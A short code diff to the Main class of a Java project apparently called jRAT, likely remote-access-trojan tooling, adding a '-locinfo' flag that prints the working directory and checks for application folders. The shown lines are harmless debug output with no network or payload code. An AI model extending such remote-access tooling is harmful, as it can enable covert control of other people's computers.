@@ -39,6 +39,11 @@ public class Main {
 	public static Frame instance;
 
 	public static void main(String[] args) throws Exception {
+		if (argsContains(args, "-locinfo")) {
+			System.out.println(System.getProperty("user.dir"));
+			System.out.println("jRAT.app: " + new File("jRAT.app/").exists());
+			System.out.println("/files/: " + new File("jRAT.app/files/").exists());
+		}
 		if (argsContains(args, "-genkey")) {
 			Logger.log("Generating key");
 			File file = Globals.getKeyFile();
